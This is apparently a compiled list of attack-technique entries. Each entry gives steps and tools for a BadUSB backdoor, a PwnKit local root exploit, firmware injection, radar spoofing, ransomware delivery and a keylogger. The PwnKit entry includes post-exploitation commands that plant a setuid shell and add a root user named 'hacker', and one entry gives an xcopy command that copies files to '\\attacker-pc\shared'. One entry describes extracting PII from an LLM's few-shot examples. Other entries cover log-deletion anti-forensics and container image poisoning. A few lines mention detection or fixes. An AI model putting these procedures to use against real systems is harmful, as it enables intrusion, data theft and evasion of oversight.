Fake USB Mass Storage with Firmware Upgrade. Device pretends to be updatable mass storage, loads backdoor via firmware update Step 1: Program microcontroller to show up as a storage device. Step 2: User opens USB and sees "FirmwareUpdate.exe". Step 3: Clicking runs disguised malware. Step 4: Malware adds persistence and backdoor. Step 5: USB appears normal with no real storage. Tools: STM32, Fake MSC

Polkit Exploit – PwnKit ([CVE_ID]). PwnKit is a local privilege escalation vulnerability found in pkexec, a component of Polkit on Linux systems. Due to improper memory initialization, a local attacker can trick pkexec into executing arbitrary commands as root without authentication. This works even if sudo is restricted, making it extremely dangerous in shared or container environments. The vulnerability affects most major Linux distributions, including Ubuntu, Debian, Fedora, and CentOS. The exploit can be executed by any unprivileged user, providing a root shell instantly. ### 🟢 STEP 1: Setup a Vulnerable Test Environment• Install Ubuntu 20.04, Debian 10, or Fedora 34 in a VM• Log in as a regular (non-root) user, e.g., student• Verify pkexec exists:which pkexec → usually [FILE_PATH] version:pkexec --version → vulnerable if Polkit < 0.120---### 🟢 STEP 2: Download the ExploitFrom trusted repo:wget [URL] clone [URL] [CVE_ID]---### 🟢 STEP 3: Compile the Exploitgcc [CVE_ID].c -o pwnkit✅ Ensure compilation is successful with no warnings---### 🟢 STEP 4: Run the Exploit./pwnkit✅ If vulnerable, the exploit spawns a root shell:id → uid=0(root)whoami → rootYou now have full root access from a local, unprivileged user---### 🟢 STEP 5: Post-Exploitation• Dump [FILE_PATH], [FILE_PATH]• Add persistent root shell:cp [FILE_PATH] [FILE_PATH] && chmod +s [FILE_PATH] -p• Create new root user:useradd -ou 0 -g 0 hacker && passwd hacker---### 🛑 STEP 6: Cleanup• Delete exploit binary: rm pwnkit• Remove added users: userdel hacker• Delete suid binaries from /tmp• Reboot or revert VM snapshot✅ Attack complete. Root gained. Tools: ✅ Linux system with vulnerable Polkit (Ubuntu, Debian, Fedora, CentOS)✅ Non-root user account✅ GCC compiler (for compiling C exploit)✅ PwnKit PoC script ([CVE_ID].c)✅ Terminal/shell access✅ Git or wget/curl to download the script✅ VirtualBox/VMware for testing in isolated lab

SOIC Clip Firmware Injection. Using a clip on flash chip, attacker writes modified firmware without desoldering Step 1: Locate flash chip and attach SOIC clip. Step 2: Connect clip to Raspberry Pi GPIO or USB programmer. Step 3: Backup original firmware using flashrom. Step 4: Modify firmware (e.g., add a backdoor shell). Step 5: Use flashrom -w to write new firmware back. Step 6: Reboot device and test modified behavior. Tools: SOIC clip, Flashrom, Custom firmware, Raspberry Pi

Radar Ghost Injection. Trick vehicle radar into detecting a ghost object (car) 1. Design a mmWave emitter matching automotive radar frequency. 2. Pulse radar patterns to simulate an approaching vehicle. 3. Position device near target car. 4. Car automatically brakes or slows down. Tools: mmWave signal emitter

Overfit via Few-Shot Prompting. Attackers exploit the AI’s tendency to “memorize” few-shot examples and reveal sensitive data embedded in those repeated examples. Step 1: Developers provide AI models with “few-shot” examples (sample inputs/outputs) that include sensitive data (e.g., real emails or names) to help AI answer correctly. Step 2: The attacker notices that these few-shot examples are repeated frequently in prompts sent to the AI. Step 3: The attacker crafts queries to retrieve these few-shot examples by asking for “show example input/output” or similar commands. Step 4: The AI replies including the exact few-shot examples containing real user data. Step 5: Because the AI overfits these examples (memorizes them), repeated exposure leaks PII. Step 6: Detection is possible by scanning prompts for repeated sensitive examples and monitoring AI output for PII leaks. Step 7: To fix, developers should avoid embedding real sensitive info in few-shot examples, anonymize or use synthetic data instead. Tools: Few-shot LLM systems, LangChain

USB Fan Used to Deliver Ransomware to IoT Infotainment System. A novelty USB fan is modified to deliver ransomware to an in-vehicle IoT dashboard system. Step 1: Attacker installs a tiny chip inside a USB fan that mimics storage.Step 2: The chip contains a ransomware binary disguised as an update file.Step 3: The fan is plugged into a car infotainment system USB slot.Step 4: System detects the fake update and installs it without verification.Step 5: Screen locks and demands payment to restore access to maps/media.Step 6: Attacker leaves no external traces as the payload auto-executes. Tools: USB fan, Hidden storage chip, Ransomware payload

File Copy via xcopy.exe. Using xcopy.exe to stealthily transfer data to external or shared directories. Step 1: Open CMD on victim system.Step 2: Create a sample file: echo secret info > [FILE_PATH] 3: Run: xcopy [FILE_PATH] \\attacker-pc\shared\ /YStep 4: Confirm the file appears on the attacker's shared folder.Step 5: Monitor xcopy executions and shared folder access.Step 6: Clear recent command history. Tools: xcopy.exe

Sensitive Cache Files. Some apps temporarily cache sensitive data (e.g., session tokens, profile info, card metadata) in internal or external storage, which can be accessed if the device is rooted or if file permissions are misconfigured. Step 1: Install the target APK on a rooted Android emulator or physical device using adb install app.apk. Step 2: Use adb shell to access the device shell, then navigate to the app's data directory: cd /data/data/com.target.app/. Step 3: List the files with ls -la cache or ls -la files, and look for cache files with names like tmp_cache.json, token_cache.txt, or .tmp. Step 4: Use cat cache/tmp_cache.json or similar to read the contents. If it's encoded or serialized, use base64 -d or inspect with a code editor. Step 5: Use grep -r 'token|email|session' ./cache/ to search for keywords inside all cache files. Step 6: Confirm that sensitive information is being cached in plaintext or easily decodable form. Step 7: Optionally, reverse engineer the APK using jadx-gui and look for logic like File cacheFile = new File(context.getCacheDir(), "token_cache.txt") or writeToCache(response.toString()) to confirm source. Step 8: Validate whether cache is cleared on logout or app close—run app > login > logout > recheck file. Step 9: If files still exist after logout, attacker can steal sessions by reading the cache. Step 10: You’ve successfully confirmed insecure caching behavior. Tools: ADB, Rooted Emulator/Device, grep, cat, ls, JADX

DROWN Attack (SSLv2 CCA). Decrypts modern TLS traffic by abusing servers supporting legacy SSLv2 with the same RSA key, acting as a padding oracle. Step 1: Find a target HTTPS server that still supports SSLv2 or shares an RSA private key with a system that supports it (e.g., SMTP over SSLv2). Step 2: Use a tool like DROWN Scanner or Wireshark to confirm SSLv2 support and key sharing. Step 3: Craft malformed SSLv2 handshake messages using chosen ciphertexts. Step 4: Send them to the SSLv2 service to observe whether decryption succeeds or fails — this acts as a padding oracle. Step 5: Use this feedback to recover the premaster secret for a TLS session encrypted with the same RSA key. Step 6: Decrypt the full TLS session (passwords, cookies, etc.). Step 7: Attack is possible even if only 1 linked service (e.g., mail server) supports SSLv2. Step 8: Disable SSLv2 entirely and use different keys for TLS and legacy services. Tools: DROWN Scanner, OpenSSL, Wireshark

Maintaining Audit Trail of USB Evidence. A USB drive containing an image of the suspect’s system is handled by multiple teams during investigation. 1. Label the USB with case ID and analyst initials.2. Place USB in tamper-evident bag with unique serial number.3. Complete chain of custody form: date/time, purpose, analyst name.4. Store USB in secured evidence locker with access logs.5. Every time USB is removed for analysis, log transfer and reason.6. After use, rebag with a new seal and log hash check.7. Final storage in long-term evidence vault.8. Scan and archive custody forms digitally.9. Provide audit trail upon request by compliance or court.10. Use barcode or RFID tagging for efficiency. Tools: Paper Chain Form, Tamper-evident Bag

Exploiting Test OTA Endpoint Left Exposed. Developers forget to disable a test OTA firmware endpoint that lacks authentication. 1. Scan IP ranges for exposed OTA dev/test endpoints using Shodan.2. Send a crafted request with a custom firmware blob.3. Due to lack of authentication, the firmware is accepted and queued for install.4. Targeted vehicles pull from this test endpoint and install backdoored firmware.5. Attacker gains persistent and stealthy control. Tools: Shodan, curl, OTA API Docs

Screen Capture via Python Keylogger. Captures screenshots alongside keystrokes to correlate sensitive actions. The attacker installs a Python-based keylogger with built-in screenshot support. The keylogger silently records every keystroke and captures a screenshot every 20 seconds using PIL or scrot. The attacker timestamps each image and uploads it to an attacker-controlled server using SFTP or Dropbox API. The combination of keystrokes and visuals allows for accurate context mapping, including passwords typed into browsers or terminals. Tools: Pyxhook, PIL, scrot

Insider Alters Retention Policies to Delete Logs. Employee modifies cloud logging retention to auto-delete logs of unauthorized actions. Step 1: Insider accesses logging console.Step 2: Edits log group retention to 1 day (from 30 days).Step 3: Performs suspicious actions: snapshotting, permission changes.Step 4: Waits for logs to expire and auto-delete.Step 5: Leaves no trace of activity. Tools: GCP Logging / AWS CloudWatch

Poisoning Container Images via Compromised Base Layers. Attackers compromise popular base images (e.g., ubuntu:latest, node:14) by injecting backdoors or malicious binaries, affecting all downstream Docker builds that inherit from them. 1. Identify open-source Docker images that are widely used as base layers. 2. Fork the Dockerfile repo or compromise credentials to the official maintainer. 3. Modify the Dockerfile to include hidden backdoors or crypto miners (e.g., in RUN or entrypoint). 4. Rebuild and publish the modified image.5. Tag it with the same or similar name (e.g., typo-squatting: nodde:14).6. Downstream projects unknowingly pull the poisoned image.7. Once containers are built, malicious processes are embedded and executed inside runtime. Tools: Docker Hub, Docker CLI

Remote IMEI Leak via STK Input Request. Attacker makes SIM prompt the victim for device IMEI and sends it back.
